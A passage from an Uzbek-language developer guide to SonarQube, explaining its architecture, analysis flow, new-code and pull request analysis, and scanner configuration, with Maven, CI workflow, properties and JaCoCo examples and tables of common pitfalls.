  - [31.5 Test yozishda doimo bajariladigan minimal to'plam](#315-test-yozishda-doimo-bajariladigan-minimal-toplam)
  - [31.6 Commit qilishdan oldingi shaxsiy tekshiruv ro'yxati](#316-commit-qilishdan-oldingi-shaxsiy-tekshiruv-royxati)
  - [31.7 Pull request ochishdan oldingi tekshiruv ro'yxati](#317-pull-request-ochishdan-oldingi-tekshiruv-royxati)
  - [31.8 Jamoaviy kelishuv: nimani bloklash, nimani ogohlantirish darajasida qoldirish](#318-jamoaviy-kelishuv-nimani-bloklash-nimani-ogohlantirish-darajasida-qoldirish)
  - [31.9 Yangi loyihani birinchi kundan toza boshlash uchun sozlamalar to'plami](#319-yangi-loyihani-birinchi-kundan-toza-boshlash-uchun-sozlamalar-toplami)
  - [31.10 Eng ko'p uchraydigan o'nta xatoni oldini oluvchi o'nta odat](#3110-eng-kop-uchraydigan-onta-xatoni-oldini-oluvchi-onta-odat)
  - [31.11 Sonar ni dushman emas, vosita sifatida ishlatish](#3111-sonar-ni-dushman-emas-vosita-sifatida-ishlatish)
  - [31.12 Amalda qo'llash](#3112-amalda-qollash)


# I. SonarQube qanday ishlaydi

## 1. SonarQube arxitekturasi va tahlil oqimi (Architecture and Analysis Flow)

SonarQube ni "kodni tekshiradigan dastur" deb bilish yetarli emas. U bir nechta alohida jarayondan iborat tizim va ularning har biri boshqa joyda, boshqa vaqtda ishlaydi. Quality gate nega qizil bo'lganini yoki nega tahlil sekin ketganini tushunish uchun avval shu qismlar va ular orasidagi ma'lumot oqimini bilish kerak. Bu bob aynan shu mexanikani ochadi, keyingi boblardagi qoida va shartlar shu asosga tayanadi.

### 1.1 SonarQube qismlari: server, web interfeys, compute engine, ma'lumotlar bazasi, scanner

SonarQube Server bitta jarayon emas, balki bir nechta sub-jarayonni boshqaradigan konteyner. Birinchisi web server: REST API va brauzerdagi interfeysni beradi, autentifikatsiya va avtorizatsiya shu yerda hal bo'ladi. Ikkinchisi compute engine, qisqacha CE: scanner yuborgan hisobotni qabul qilib, uni haqiqiy natijaga aylantiradi. Uchinchisi search server, ya'ni ichki Elasticsearch: issue va komponentlar bo'yicha tez qidiruv va filtrlash uchun indeks saqlaydi.

Ma'lumotlar bazasi barcha doimiy ma'lumotni ushlab turadi: loyihalar, tahlil tarixi, metrika qiymatlari, issue lar, quality profile va quality gate sozlamalari. Production uchun PostgreSQL odatiy tanlov, Oracle va SQL Server ham qo'llanadi, ichki H2 esa faqat sinov uchun. Elasticsearch indeksi ikkilamchi: u bazadan qayta tiklanadi, shuning uchun backup strategiyasi bazaga va sozlama fayllariga qaratiladi.

Scanner esa serverda emas, sizning build muhitida ishlaydi. Java loyihada bu `sonar-maven-plugin` yoki Gradle `sonarqube` plugini, boshqa hollarda SonarScanner CLI. Scanner kodni o'qiydi, qoidalarni bajaradi va natijani hisobot sifatida serverga yuboradi. Ya'ni kodingiz serverga ko'tarilmaydi, ko'tariladigan narsa hisobot va unda keltirilgan kod parchalari.

### 1.2 SonarQube Server, SonarQube Cloud va IDE kengaytmasi o'rtasidagi farq

Uchta mahsulot bir xil qoida bazasiga tayanadi, lekin qaerda ishlashi va kimga javob berishi bilan farq qiladi. SonarQube Server o'zingiz joylashtirgan instansiya: versiyani, quality profile ni va saqlanish muddatini siz boshqarasiz. SonarQube Cloud (avvalgi nomi SonarCloud) xuddi shu modelning SaaS varianti: server va baza haqida qayg'urmaysiz, lekin versiya va ba'zi sozlamalar provayder qo'lida bo'ladi. Nomlar 2024 yildan beri o'zgargan, shuning uchun eski hujjatlarda SonarCloud va SonarLint atamalarini uchratasiz.

IDE kengaytmasi (avvalgi nomi SonarLint, hozir SonarQube for IDE) uchinchi turdagi vosita: u developer mashinasida, saqlash paytida ishlaydi va darhol ogohlantiradi. Muhim nuqta shu: kengaytma o'zi hech qanday natijani serverga yozmaydi va quality gate ga ta'sir qilmaydi. U faqat mahalliy fayllarni ko'radi, shuning uchun loyiha bo'yicha duplikatsiya yoki coverage kabi global metrikalarni hisoblay olmaydi.

Shu sababli kengaytmani serverga ulash (connected mode) amalda juda ko'p vaqtni tejaydi. Ulangan holatda kengaytma loyihaning quality profile ini va o'chirilgan qoidalarni serverdan oladi. Natijada IDE da ko'rgan ogohlantirish CI dagi natijaga mos keladi va "menda toza edi" vaziyati kamayadi.

### 1.3 Tahlilning to'liq yo'li: scanner dan compute engine gacha

Oqim har doim bir xil ketadi. Build tizimi testlarni ishga tushiradi va artefaktlarni yasaydi, keyin scanner ishga tushadi. Scanner serverdan loyihaning quality profile ini, faol qoidalar ro'yxatini va ba'zi sozlamalarni so'raydi. So'ng fayllarni tahlil qilib, topilgan issue lar, metrikalar, duplikatsiya bloklari va import qilingan coverage ma'lumotini bitta arxiv hisobotga yig'adi.

Shundan keyin scanner hisobotni serverga yuboradi va o'z ishini tugatadi. Server hisobotni navbatga qo'yadi va scanner ga task identifikatorini qaytaradi. Compute engine navbatdan vazifani oladi, hisobotni ochadi, fayllarni avvalgi tahlil bilan solishtiradi, issue larni yangi yoki eski deb belgilaydi, metrikalarni agregatlaydi va oxirida quality gate shartlarini tekshiradi. Natija bazaga yoziladi, indeks yangilanadi, webhook lar yuboriladi.

Bu ikki bosqichli tuzilma bitta amaliy natijaga olib keladi: `mvn sonar:sonar` muvaffaqiyatli tugashi quality gate o'tganini bildirmaydi. CI qadamini haqiqiy natijaga bog'lash uchun `sonar.qualitygate.wait=true` kerak yoki task statusini o'zingiz kuzatishingiz lozim.

```bash
# 1-qadam: testlar va JaCoCo XML hisoboti. Sonar bu fayllarni o'zi yasamaydi.
mvn -B clean verify

# 2-qadam: tahlil. Scanner target/classes va jacoco.xml ni o'qiydi.
mvn -B sonar:sonar \
  -Dsonar.host.url=https://sonar.company.local \
  -Dsonar.token="$SONAR_TOKEN" \
  -Dsonar.projectKey=payments-api \
  -Dsonar.qualitygate.wait=true \
  -Dsonar.qualitygate.timeout=600

# 3-qadam: wait ishlatilmasa, CE vazifasini qo'lda kuzatamiz.
TASK_URL=$(grep -m1 'ceTaskUrl' target/sonar/report-task.txt | cut -d= -f2-)
curl -sS -u "$SONAR_TOKEN": "$TASK_URL" | jq -r '.task.status'
# PENDING -> navbatda, IN_PROGRESS -> hisoblanmoqda, SUCCESS -> natija tayyor
```

### 1.4 Scanner kodni qanday o'qiydi: sintaksis daraxti, semantik model, bytecode

Scanner matnni qatorlab o'qimaydi. Avval har bir faylni parse qilib sintaksis daraxtini (AST) tuzadi. Juda ko'p qoida shu daraxt ustida ishlaydi: metod uzunligi, ichma-ich shartlar soni, `switch` da `default` yo'qligi, bo'sh `catch` bloki. Cognitive complexity qoidasi (`java:S3776`) ham shu darajada hisoblanadi: har bir shoxlanish va har bir qo'shimcha ichkarilash ball qo'shadi.

Keyingi daraja semantik model. Bu yerda scanner har bir nomni haqiqiy tipga bog'laydi: `repo` nima, `findById` qanday tip qaytaradi, `Order` qaysi interfeysni amalga oshiradi. Semantik model bo'lmasa, scanner `orElse(null)` natijasining null bo'lishi mumkinligini bilmaydi va `java:S2259` kabi qoida ishlamay qoladi. Nazariy jihatdan farq katta: sintaktik qoidalar "shakl" ni ko'radi, semantik qoidalar "ma'no" ni ko'radi.

Uchinchi manba bytecode. Kompilyatsiya qilingan klasslar va klasspath kutubxonalari scanner ga tiplarning to'liq ierarxiyasini beradi. Shu bilan Sonar `Throwable` ushlanganini, `AutoCloseable` resurs yopilmaganini yoki Spring annotatsiyalarining haqiqiy ma'nosini aniq biladi.

```java
// Semantik model bor paytda Sonar bu ikki metodni butunlay boshqacha ko'radi.
@Service
public class OrderService {

    private final OrderRepository repo;

    public OrderService(OrderRepository repo) {
        this.repo = repo;
    }

    // Yomon variant: orElse(null) null manbasi, keyin darhol dereference.
    public BigDecimal totalBad(long id) {
        Order order = repo.findById(id).orElse(null);
        return order.total();            // java:S2259 shu qatorga tushadi
    }

    // Sonar o'tadigan variant: Optional zanjiri uzilmaydi, null umuman yo'q.
    public BigDecimal total(long id) {
        return repo.findById(id)
                .map(Order::total)
                .orElseThrow(() -> new OrderNotFoundException(id));
    }
}
```

### 1.5 Nega kompilyatsiya qilingan klasslar kerak

Java tahlili uchun Sonar kompilyatsiya natijasini talab qiladi. Maven yoki Gradle orqali ishlaganda bu yo'l avtomatik aniqlanadi, scanner CLI da esa qo'lda beriladi. Klasslar yo'q bo'lsa scanner ogohlantirish yozadi va tahlilni davom ettiradi, lekin natija sifatli bo'lmaydi.

Zaiflashuv aniq ko'rinadi. Tip ierarxiyasini tiklay olmagan scanner ko'p qoidani umuman ishlatmaydi, boshqalarini esa ehtiyot yuzasidan sust bajaradi. Shunda hisobotda issue lar soni kamayadi va bu yaxshilik deb tuyuladi, aslida esa tahlil ko'r bo'lib qolgan. Eng xavfli holat: quality gate yashil, chunki tekshiruvning yarmi bajarilmagan.

Klasspath kutubxonalari ham xuddi shunday muhim. `sonar.java.libraries` ko'rsatilmasa, loyihangiz kodi tahlil qilinadi, lekin Spring, Jackson yoki JPA tiplari noma'lum bo'lib qoladi. Shuning uchun tahlil qadami har doim `verify` yoki hech bo'lmasa `test-compile` dan keyin turishi kerak.

```properties
# sonar-project.properties: Maven dan tashqari scanner CLI uchun
sonar.projectKey=warehouse-core
sonar.projectName=Warehouse Core
sonar.sources=src/main/java
sonar.tests=src/test/java
sonar.java.source=21

# Semantik tahlil uchun kompilyatsiya natijasi shart
sonar.java.binaries=target/classes
sonar.java.test.binaries=target/test-classes
# Klasspath: tiplarni to'liq tiklash uchun bog'liqliklar ro'yxati
sonar.java.libraries=target/dependency/*.jar

# Coverage Sonar tomonidan o'lchanmaydi, faqat import qilinadi
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml

# Generatsiya qilingan kod tahlildan ham, coverage dan ham chiqadi
sonar.exclusions=**/generated/**,**/*MapperImpl.java
```

### 1.6 Natija qayerda saqlanadi va loyiha tarixi qanday to'planadi

Har bir muvaffaqiyatli tahlil bazada yangi snapshot yaratadi. Snapshot ga o'sha paytdagi metrika qiymatlari bog'lanadi: coverage, duplikatsiya ulushi, qatorlar soni, issue lar soni va boshqalar. Shu tarzda loyiha tarixi yig'iladi va interfeysdagi grafiklar aynan shu ma'lumotdan chiziladi.

Issue lar esa snapshot ga emas, loyihaga bog'langan holda yashaydi. Ularning holati tahlillar orasida saqlanadi: ochiq, tuzatilgan, yoki qo'lda "won't fix" deb belgilangan. CE har bir tahlilda issue larni fayl, qatorlar va kod xesh bo'yicha solishtiradi. Shu sababli faylni ko'chirsangiz yoki formatlasangiz, ko'p issue o'z tarixini saqlab qoladi, lekin ba'zilari yangi deb hisoblanishi mumkin.

Tarix cheksiz o'smaydi. "Housekeeping" sozlamalari eski snapshot larni siqadi va ma'lum muddatdan keyin o'chiradi, shuningdek yopilgan branch ma'lumotini tozalaydi. Katta instansiyada bu sozlamalar baza hajmiga to'g'ridan to'g'ri ta'sir qiladi.

```sql
-- OGOHLANTIRISH: bu sxema ichki va versiyalar orasida o'zgaradi.
-- Jadval hamda ustun nomlari sizning versiyada boshqacha bo'lishi mumkin.
-- Qo'llab-quvvatlanadigan to'g'ri yo'l: /api/measures/search_history.
SELECT s.created_at,
       m.name  AS metric,
       pm.value
FROM snapshots s
JOIN project_measures pm ON pm.analysis_uuid = s.uuid
JOIN metrics m           ON m.uuid = pm.metric_uuid
WHERE s.root_component_uuid = :project_uuid
  AND m.name IN ('coverage', 'duplicated_lines_density')
ORDER BY s.created_at DESC
LIMIT 20;
```

### 1.7 Branch va pull request tahlili

Asosiy branch tahlili loyihaning "haqiqat manbasi" bo'lib qoladi: uning natijasi loyiha sahifasida ko'rinadi va tarixga yoziladi. Boshqa branch lar alohida kontekst sifatida saqlanadi, ularning o'z quality gate holati bo'ladi. PR tahlili esa butunlay boshqa maqsadga xizmat qiladi: u faqat o'zgargan kodga qaraydi va natijani maqsadli branch bilan taqqoslaydi.

Shuning uchun PR da ko'rinadigan metrikalar "new code" metrikalaridir. Coverage ustuni ham umumiy coverage emas, balki yangi qatorlar ustidagi coverage bo'ladi. Bu amalda sog'lom qoida: eski kodni bir kechada qoplash imkonsiz, lekin yangi kodni qoplash har doim mumkin.

New code ta'rifi uchta variantdan biri bilan sozlanadi: oldingi versiya, ma'lum kun soni, yoki referens branch. Referens branch varianti trunk based ishlaydigan jamoalar uchun eng tushunarli natija beradi. Shuni ham eslatish kerak: SCM ma'lumoti to'liq bo'lmasa, Sonar qatorning qachon o'zgarganini aniqlay olmaydi va new code chegarasi noto'g'ri chiqadi.

```bash
# Pull request tahlili: Sonar PR ni maqsadli branch bilan solishtiradi.
mvn -B sonar:sonar \
  -Dsonar.pullrequest.key=1428 \
  -Dsonar.pullrequest.branch=feature/stock-reservation \
  -Dsonar.pullrequest.base=main

# Oddiy branch tahlili
mvn -B sonar:sonar -Dsonar.branch.name=release/2025.3

# DevOps platformasi integratsiyasi yoqilgan bo'lsa, bu parametrlar
# ko'pincha avtomatik aniqlanadi va ularni qo'lda berish shart emas.
```

```yaml
name: sonar
on:
  push:
    branches: [ main, "release/**" ]
  pull_request:
    types: [ opened, synchronize, reopened ]
jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0        # blame va new code uchun to'liq tarix kerak
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'
      - name: Sonar keshini saqlash
        uses: actions/cache@v4
        with:
          path: ~/.sonar/cache
          key: sonar-${{ runner.os }}
      - run: mvn -B clean verify
      - run: mvn -B sonar:sonar -Dsonar.qualitygate.wait=true
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
```

### 1.8 Tahlil davomiyligi va uni qisqartirish

Scanner tomonidagi vaqtni asosan ikki narsa yeydi: fayllar soni va semantik tahlil hajmi. Har bir fayl parse qilinadi, tip model tuziladi va o'nlab qoida bajariladi. Kattaroq ta'sir ko'rsatadigan yana bir omil: generatsiya qilingan kod. MapStruct, Protobuf yoki OpenAPI dan chiqqan minglab fayl tahlilni ikki baravar cho'zishi mumkin, holbuki ularni tekshirishdan foyda yo'q.

Ikkinchi manba SCM blame. Sonar new code chegarasini aniqlash uchun har bir qatorning oxirgi commit ini biladi. Shallow clone da bu ma'lumot yo'q, to'liq clone da esa katta repozitoriyda blame sekin ketadi. Shuning uchun CI da `fetch-depth: 0` qo'yiladi, lekin build agentda git keshi bo'lishi ham foydali.

Uchinchi manba baza va CE tomoni, bu haqda keyingi bo'limda. Qisqartirishning eng ishonchli uchta yo'li: keraksiz fayllarni `sonar.exclusions` bilan chiqarish, scanner keshini saqlash, va tahlilni har commit da emas, balki PR va asosiy branch push ida ishlatish.

| Mavzu | Oddiy yondashuv | Arxitektor yondashuvi |
| --- | --- | --- |
| Tahlilni ishga tushirish | Alohida `sonar:sonar` qadami, `verify` dan ajralgan | `verify` dan keyin, bir xil workspace ichida |
| Kompilyatsiya | Scanner nimani topsa shuni o'qiydi | `binaries` va `libraries` aniq belgilangan, log tekshiriladi |
| Coverage | JaCoCo ni Sonar o'lchaydi deb o'ylash | JaCoCo XML yasaladi va `xmlReportPaths` bilan import qilinadi |
| Quality gate | `mvn` yashil bo'ldi, demak o'tdi | `sonar.qualitygate.wait` yoki CE task kuzatuvi |
| New code | Standart sozlama tegilmaydi | Referens branch tanlanadi va jamoaga tushuntiriladi |
| PR tahlili | Faqat asosiy branch tekshiriladi | Har PR da new code gate merge shartiga bog'lanadi |
| Tahlil vaqti | Sekinlashsa ham chidashadi | Generatsiya qilingan kod chiqariladi, kesh saqlanadi |
| Versiya | Yangi chiqqanda darhol yangilanadi | LTA liniyasida yuriladi, oraliq versiyalar sinovda |
| Natijani kutish | Interfeysni qo'lda yangilab turish | Webhook yoki `wait` orqali avtomatik javob |
| Exclusions | Issue ko'p chiqqan fayl o'chiriladi | Exclusion coverage ga ta'sirini bilib qo'llaniladi |

### 1.9 Server versiyalari: LTA liniyasi va yangilanish siyosati

SonarQube Server ikki xil versiya chiqaradi. Oraliq versiyalar tez tez keladi va yangi qoida, yangi til imkoniyatlarini olib keladi. LTA (Long Term Active, eski nomi LTS) versiyasi esa uzoq muddat qo'llab-quvvatlanadi va asosan tuzatishlar oladi. 9.9 LTA uzoq vaqt sanoat standarti bo'lib turdi, keyin 2025 LTA liniyasi uni almashtirdi. Nom berish uslubi ham o'zgardi: eski semantik raqamlar o'rniga yil asosidagi versiyalar ishlatiladi.

Amaliy siyosat oddiy. Production instansiyani LTA da ushlab turish eng kam ishqalanishni beradi: migratsiya kam, qoida bazasi barqaror, quality gate natijasi kutilmaganda o'zgarmaydi. Oraliq versiya kerak bo'ladigan holat ham bor: masalan yangi Java versiyasi sintaksisini tahlil qilish uchun. Java 17 dan 21 va undan yuqorisiga o'tayotgan bo'lsangiz, scanner va server versiyasi shu tilni qo'llashini tekshirish shart.

Yangilashda bitta nozik nuqta bor: qoida bazasi yangilansa, mavjud kodda yangi issue lar paydo bo'ladi. Ular new code emas, eski kodda topiladi, shuning uchun gate ni darhol buzmasligi kerak. Shunga qaramay yangilashni asosiy release dan ajratib, alohida oynada bajarish to'g'ri.

```xml
<build>
  <plugins>
    <plugin>
      <groupId>org.jacoco</groupId>
      <artifactId>jacoco-maven-plugin</artifactId>
      <version>0.8.12</version>
      <executions>
        <!-- Agent ni surrogate qilib qo'shadi, argLine o'zgaruvchisini beradi -->
        <execution><id>prepare</id><goals><goal>prepare-agent</goal></goals></execution>
        <!-- XML hisobot: Sonar faqat shu formatni import qiladi -->
        <execution>
          <id>report</id><phase>verify</phase>
          <goals><goal>report</goal></goals>
        </execution>
      </executions>
    </plugin>
    <plugin>
      <groupId>org.sonarsource.scanner.maven</groupId>
      <artifactId>sonar-maven-plugin</artifactId>
      <version>4.0.0.4121</version>
    </plugin>
  </plugins>
</build>
```

### 1.10 Kechikish sabablari: tahlil tugadi, natija hali yo'q

Developer uchun eng bezovta qiladigan holat shu: CI yashil, lekin Sonar sahifasida eski natija turadi. Sabab deyarli har doim compute engine navbatida. Bir loyiha uchun bir vaqtda bitta vazifa bajariladi, parallel worker soni esa litsenziya darajasiga qarab farq qiladi. Katta monorepo yoki ko'p loyihali instansiyada navbat kutish vaqti tahlilning o'zidan uzun bo'lishi mumkin.

Ikkinchi sabab hisobot hajmi. Yuz minglab qator va ko'p issue bor loyihada CE ishlov berish uzoq ketadi, ayniqsa baza sekin bo'lsa. Uchinchi sabab indekslash: issue lar bazaga yozilgandan keyin Elasticsearch indeksi yangilanadi, shu orada qidiruv natijasi eskicha ko'rinishi mumkin. To'rtinchisi webhook: bitiruv xabari yetib kelmasa, CI ni to'xtatib turgan qadam timeout gacha kutadi.

| Tuzoq | Nimaga olib keladi | Yechim |
| --- | --- | --- |
| Shallow clone (`fetch-depth: 1`) | New code chegarasi noto'g'ri, blame yo'q | CI da to'liq tarix olinadi |
| `sonar:sonar` ni `verify` dan oldin ishlatish | Klasslar yo'q, semantik qoidalar o'chadi | Tahlil `verify` dan keyin turadi |
| JaCoCo `argLine` ni qo'lda bosib yozish | Agent yoqilmaydi, coverage nol chiqadi | `@{argLine}` orqali kengaytiriladi |
| XML hisobot yasalmagan | Coverage 0% ko'rinadi, gate buziladi | `report` goal `verify` fazasiga bog'lanadi |
| Keng `sonar.exclusions` | Coverage sun'iy ko'tariladi, xavf yashiriladi | Exclusion faqat generatsiya qilingan kodga |
| `qualitygate.wait` ishlatilmagan | Gate qizil, lekin merge o'tib ketadi | `wait` yoki webhook bilan bog'lanadi |
| Token ni log ga chiqarish | Secret oqib ketadi | Faqat CI secret o'zgaruvchisi orqali |
| Production da H2 baza | Ma'lumot yo'qoladi, migratsiya yo'q | PostgreSQL va kunlik backup |
| Bitta CE worker, ko'p loyiha | Navbat uzayadi, natija kechikadi | Worker soni va tahlil jadvali ko'rib chiqiladi |

### 1.11 Amalda qo'llash

- [ ] CI log ida scanner ogohlantirishlarini o'qib chiqing va "binaries not found" turidagi xabar yo'qligiga ishonch hosil qiling.
- [ ] Tahlil qadamini `verify` dan keyinga ko'chiring, JaCoCo XML hisoboti haqiqatan yasalayotganini fayl mavjudligi bilan tekshiring.
- [ ] `sonar.qualitygate.wait=true` ni qo'shing va timeout ni o'zingizning o'rtacha CE vaqtidan ikki baravar katta qo'ying.
- [ ] Loyihaning new code ta'rifini ko'rib chiqing, trunk based ishlasa referens branch variantiga o'tkazing.
- [ ] CI checkout da to'liq git tarixi olinishini ta'minlang, aks holda new code metrikalariga ishonmang.
- [ ] Generatsiya qilingan kodni `sonar.exclusions` ga kiriting va bu o'zgarish coverage raqamiga qanday ta'sir qilganini yozib qo'ying.
- [ ] Jamoadagi IDE kengaytmalarini serverga connected mode da ulang, shunda mahalliy va CI natijalari mos keladi.
- [ ] Server versiyangiz LTA liniyasida ekanini tasdiqlang va yangilashni release oynasidan ajratib rejalashtiring.

## 2. Scanner nimani yig'adi va qanday yuboradi (What the Scanner Collects)

Sonar serverdagi quality gate qanchalik aqlli sozlangan bo'lsa ham, u faqat scanner yuborgan ma'lumot ustida ishlaydi. Scanner esa sizning konfiguratsiyangizga so'zsiz bo'ysunadi: siz ko'rsatmagan papkani o'qimaydi, siz ulamagan coverage hisobotini o'ylab topmaydi, kompilyatsiya natijasini topmasa esa qoidalarning yarmini jimgina o'chiradi. Shuning uchun "nega mening testlarim bor, lekin coverage 0%" degan savolning javobi deyarli har doim serverda emas, `sonar-project.properties` faylida yoki build loginida yotadi. Bu bobda scanner nimani yig'adi, nimani ko'rmaydi va yuborishdan oldin buni qanday tekshirish mumkinligini ko'rib chiqamiz.

### 2.1 `sonar-project.properties` va asosiy parametrlar

Mustaqil scanner uchun konfiguratsiya loyiha ildizidagi `sonar-project.properties` faylida yashaydi. Maven va Gradle loyihalarida bu fayl shart emas, chunki plugin ko'p narsani build modelidan o'zi oladi. Lekin uch parametr har qanday holatda ma'noga ega: `sonar.projectKey`, `sonar.sources` va `sonar.tests`.

`sonar.projectKey` loyihaning serverdagi o'zgarmas identifikatori. U tarix, issue holati va quality gate natijasini bir joyga bog'laydigan kalit. Uni o'zgartirish yangi loyiha yaratish bilan teng: eski tarix yo'qolmaydi, lekin yangi kalit bo'sh tarix bilan boshlanadi va "new code" hisobi noldan ketadi.

```properties
# Serverdagi o'zgarmas kalit. O'zgartirsangiz tarix uzilib qoladi.
sonar.projectKey=uz.example:payment-service
sonar.projectName=Payment Service
# Manba kodi va test kodi ALOHIDA ko'rsatiladi.
sonar.sources=src/main/java,src/main/resources
sonar.tests=src/test/java
# Kodlash sxemasi: noto'g'ri bo'lsa kiril va lotin belgilar buziladi.
sonar.sourceEncoding=UTF-8
# Kompilyatsiya natijasi va klasspath (Java uchun majburiy).
sonar.java.binaries=target/classes
sonar.java.libraries=target/dependency/*.jar
sonar.java.test.binaries=target/test-classes
sonar.java.test.libraries=target/dependency/*.jar
# Tashqi hisobotlar.
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml
sonar.junit.reportPaths=target/surefire-reports
```

Bu yerda eng ko'p xato qilinadigan joy `sonar.projectVersion`. U faqat chiroyli yorliq emas: ba'zi "new code" strategiyalarida oldingi versiya bilan taqqoslash asosi bo'lib ishlaydi. Agar siz har build da `1.0-SNAPSHOT` yuborsangiz, versiyaga asoslangan taqqoslash ma'nosini yo'qotadi.

### 2.2 Manba va test papkalarini to'g'ri ko'rsatish

Sonar uchun manba kod va test kodi ikki boshqa dunyo. Ularga boshqa qoida to'plami qo'llanadi, coverage faqat manba kod ustida hisoblanadi, duplication esa odatda testlarda kechirimli bo'ladi. Shuning uchun test papkasini `sonar.sources` ichiga qo'shib yuborish eng og'riqli xatolardan biri.

Oqibati shunday bo'ladi. Birinchidan, coverage foizi tushadi, chunki test fayllari ham "qoplanishi kerak bo'lgan kod" sifatida hisoblanadi, lekin ularni hech kim test qilmaydi. Ikkinchidan, test kodidagi `assertThat` chaqiruvlari va mock sozlashlari duplication hisobiga tushib, "Duplicated Lines" metrikasini shishiradi. Uchinchidan, test uchun maxsus qoidalar (masalan "testda assertion yo'q" yoki "ignored test") umuman ishlamay qoladi, chunki fayl test emas deb qabul qilingan.

Teskari xato ham bor: `sonar.tests` ni ko'rsatmaslik. Bunda test kodi tahlildan butunlay tushib qoladi va test sifatini tekshiradigan qoidalar ishlamaydi. Natijada `@Disabled` qo'yilgan o'nlab test yillar davomida ko'rinmas bo'lib qoladi.

| Tuzoq | Nima sodir bo'ladi | Yechim |
|---|---|---|
| `sonar.sources=src` deb bitta ildiz berish | Test kodi manba sifatida hisoblanadi, coverage tushadi | `src/main/java` va `src/test/java` ni ajratish |
| `sonar.tests` ko'rsatilmagan | Test qoidalari ishlamaydi, `@Disabled` ko'rinmaydi | `sonar.tests` ni aniq berish |
| Generatsiya qilingan kod `sources` ichida | MapStruct va QueryDSL kodi issue to'plab beradi | `sonar.exclusions` ga generatsiya papkasini qo'shish |
| `sonar.java.binaries` yo'q | Java tahlili xato bilan to'xtaydi yoki qoidalar o'chadi | Avval `mvn compile`, keyin scanner |
| Coverage XML yo'li noto'g'ri | Coverage 0% ko'rinadi, gate yiqiladi | `jacoco.xml` ni build dan keyin tekshirish |
| `shallow clone` bilan CI | Yangi kod va "new code" muallifi aniqlanmaydi | `fetch-depth: 0` qo'yish |
| `sonar.exclusions` juda keng | Haqiqiy muammolar yashirinadi, gate yolg'on yashil bo'ladi | Exclusion ni fayl darajasida aniq yozish |
| Monorepoda bitta `projectKey` | Bir jamoaning xatosi boshqasining gate ini yiqitadi | Modul yoki servis bo'yicha alohida kalit |

### 2.3 `sonar.java.binaries` va `sonar.java.libraries`: nega majburiy

Java tahlilchisi faqat matnni o'qimaydi. U semantik model quradi: `userRepository.findById(id)` nima qaytaradi, `Optional` ustida `get()` chaqirilayotgani xavflimi, `equals` haqiqatan ham override qilinganmi. Bu savollarga javob berish uchun unga bytecode va klasspath kerak.

`sonar.java.binaries` kompilyatsiya qilingan `.class` fayllar turgan papkani ko'rsatadi. Agar u berilmasa, Java tahlili xato bilan to'xtaydi. `sonar.java.libraries` esa bog'liqlik jar fayllarini ko'rsatadi. U berilmasa tahlil ishlaydi, lekin yarim ko'r holda: Spring `@Transactional` semantikasi, `Optional` zanjiri yoki custom annotation bilan bog'liq qoidalar jim bo'lib qoladi. Scanner buni log da ogohlantirish bilan aytadi, lekin build ni yiqitmaydi. Shu sabab ko'p jamoa yillar davomida qoidalarning bir qismi o'chirilgan holda ishlaydi va buni bilmaydi.

Maven va Gradle plugin bu ikki parametrni build modelidan o'zi hisoblab qo'yadi. Shuning uchun amaliy qoida oddiy: Java loyihada mustaqil scanner emas, build tizimi plugin ini ishlatish ma'qul.

```bash
# Mustaqil scanner bilan ishlasangiz, klasspathni qo'lda yig'ish kerak.
mvn -B clean verify
mvn -B dependency:copy-dependencies -DoutputDirectory=target/dependency

# Shundan keyingina scanner ishga tushadi.
sonar-scanner \
  -Dsonar.host.url="$SONAR_HOST_URL" \
  -Dsonar.token="$SONAR_TOKEN"

# Log da shu ogohlantirishni izlang: klasspath bo'sh bo'lsa tahlil yarim ko'r.
# "Bytecode of dependencies was not provided for analysis"
```

### 2.4 Tashqi hisobotlarni ulash

Sonar coverage ni o'zi o'lchamaydi. U JaCoCo kabi vositalar yozgan XML hisobotni o'qiydi va undagi raqamlarni o'z fayl modeliga moslaydi. Shu sababli coverage hamisha ikki qadamli jarayon: avval test ishga tushadi va hisobot yoziladi, keyin scanner uni o'qiydi. Tartib buzilsa coverage 0% bo'ladi va buning sababi Sonar emas.

Java uchun to'g'ri parametr `sonar.coverage.jacoco.xmlReportPaths`. U aynan XML ni kutadi, `jacoco.exec` binar faylini emas. Shuning uchun Maven da `report` goal ni va XML formatni yoqish shart.

```xml
<plugin>
  <groupId>org.jacoco</groupId>
  <artifactId>jacoco-maven-plugin</artifactId>
  <version>0.8.12</version>
  <executions>
    <execution>
      <id>prepare-agent</id>
      <goals><goal>prepare-agent</goal></goals>
    </execution>
    <execution>
      <!-- XML hisobot majburiy: Sonar binar exec faylni o'qimaydi. -->
      <id>report</id>
      <phase>verify</phase>
      <goals><goal>report</goal></goals>
    </execution>
  </executions>
</plugin>
```

Test natijalari uchun `sonar.junit.reportPaths` Surefire va Failsafe XML papkalarini oladi. U coverage ga ta'sir qilmaydi, lekin "Unit Test Errors" va test soni metrikalarini to'ldiradi. Checkstyle, PMD va SpotBugs hisobotlarini ham ulash mumkin: ularning topilmalari Sonar ichida alohida tashqi issue sifatida ko'rinadi va quality gate shartlariga ta'sir qilishi mumkin. Bu qulay, lekin takrorlanishni keltiradi: bir xil muammo ikki marta sanaladi. Shuning uchun amalda ikkitadan birini tanlash kerak, ikkalasini birga yoqmaslik.

```properties
# Test natijalari (unit va integratsion alohida papkada bo'lsa ikkisini ham).
sonar.junit.reportPaths=target/surefire-reports,target/failsafe-reports
# Bir nechta modul uchun XML yo'llarini vergul bilan sanash mumkin.
sonar.coverage.jacoco.xmlReportPaths=\
  order-service/target/site/jacoco/jacoco.xml,\
  payment-service/target/site/jacoco/jacoco.xml
# Tashqi linter hisobotlari: Sonar qoidalari bilan takrorlanmasligiga ishonch qiling.
sonar.java.checkstyle.reportPaths=target/checkstyle-result.xml
sonar.java.pmd.reportPaths=target/pmd.xml
sonar.java.spotbugs.reportPaths=target/spotbugsXml.xml
```

Integratsion testlar coverage ga qanday qo'shilishi testlash qo'llanmasidagi "integratsion test va Testcontainers" mavzusiga tegishli. Bu yerda muhimi shu: agar `failsafe` bosqichi `verify` dan oldin tugamasa, uning coverage ma'lumoti XML ga tushmaydi.

### 2.5 Maven, Gradle va mustaqil scanner

